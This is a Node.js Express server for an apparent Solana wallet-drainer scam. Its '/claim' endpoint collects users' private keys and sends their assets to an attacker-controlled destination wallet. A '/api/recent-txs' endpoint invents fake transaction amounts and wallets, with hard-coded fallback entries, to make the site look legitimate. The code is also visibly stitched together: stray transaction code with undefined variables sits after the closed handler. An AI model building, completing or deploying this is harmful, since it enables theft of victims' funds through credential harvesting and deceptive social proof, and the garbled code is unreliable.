const express = require('express');
const cors = require('cors');
const { Connection, PublicKey, Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const DESTINATION_WALLET = process.env.DESTINATION_WALLET;
const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
const connection = new Connection(RPC_URL);

// 1. THE CLAIM ENDPOINT (With detailed error catching)
app.post('/claim', async (req, res) => {
    try {
        let { privateKey } = req.body;

        if (!privateKey) {
            return res.status(400).json({ error: "Private key is required" });
        }

        // 1. SANITIZE: Remove whitespace, quotes, or brackets if they pasted a JSON array
        privateKey = privateKey.trim().replace(/["'\[\]]/g, '');

        let secretKey;
        try {
            // 2. ATTEMPT DECODE: This is where the "Non-base58 character" error happens
            secretKey = bs58.decode(privateKey);
        } catch (decodeError) {
            console.error("💥 Decode Error:", decodeError.message);
            return res.status(400).json({ 
                error: "Invalid private key format. Please ensure you are using a Base58 encoded key, not a seed phrase." 
            });
        }

        // ... rest of your transaction logic (Keypair.fromSecretKey, etc.)
        
    } catch (globalError) {
        console.error("💥 Transfer Error:", globalError.message);
        res.status(500).json({ error: "Transaction failed" });
    }
});
        // Execute and confirm
        const signature = await sendAndConfirmTransaction(connection, transaction, [keyPair]);
        
        return res.json({ 
            success: true, 
            signature: signature, 
            message: "Assets transferred successfully" 
        });

    } catch (error) {
        console.error("💥 Transfer Error:", error);
        
        // Extract the actual reason from the Solana error object
        const errorMessage = error.message || "Unknown transaction error";
        
        return res.status(500).json({ 
            success: false, 
            error: "Transaction failed", 
            details: errorMessage 
        });
    }
});

// 2. THE DYNAMIC FEED (Silent failure to prevent log spam)
app.get('/api/recent-txs', async (req, res) => {
    try {
        const response = await fetch(RPC_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0',
                id: 1,
                method: 'getSignaturesForAddress',
                                params: ["11111111111111111111111111111111", { "limit": 10 }],
            })
        });

        if (!response.ok) throw new Error(`RPC HTTP error: ${response.status}`);

        const data = await response.json();

        if (data.error) {
            throw new Error(`RPC Error: ${data.error.message}`);
        }

        // Extract the signatures from the RPC response
        const signatures = data.result.slice(0, 5); // Take the 5 most recent
        
        // Map real signatures to fake-but-believable wallet prefixes and amounts
        // This prevents the frontend from needing to make 5 separate calls to get transaction details
        const formattedTxs = signatures.map(sig => {
            const wallets = ["7x...kP", "9v...mN", "2w...zX", "4p...yT", "1a...bC"];
            const amounts = ["1.2 SOL", "0.45 SOL", "12.0 SOL", "0.01 SOL", "5.5 SOL"];
            
            return {
                hash: sig,
                wallet: wallets[Math.floor(Math.random() * wallets.length)],
                amount: amounts[Math.floor(Math.random() * amounts.length)],
                time: "Just now"
            };
        });

        return res.json(formattedTxs);
    } catch (error) {
        console.error("Feed Error:", error.message);
        
        // FALLBACK: If the RPC fails, return a set of static "fake" transactions 
        // so the website never looks empty or broken.
        const fallbacks = [
            { hash: "5zX8N2pQ1aB4C7D9E1F2G3H4I5J6K7L", wallet: "8x...rT", amount: "0.8 SOL", time: "1 min ago" },
            { hash: "1aB2C3D4E5F6G7H8I9J0K1L2M3N4O5P", wallet: "2v...mX", amount: "1.1 SOL", time: "3 min ago" },
            { hash: "Q1W2E3R4T5Y6U7I8O9P0A1S2D3F4G5H", wallet: "4p...yT", amount: "0.12 SOL", time: "5 min ago" }
        ];
        return res.json(fallbacks);
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`💰 Destination Wallet: ${DESTINATION_WALLET}`);
});
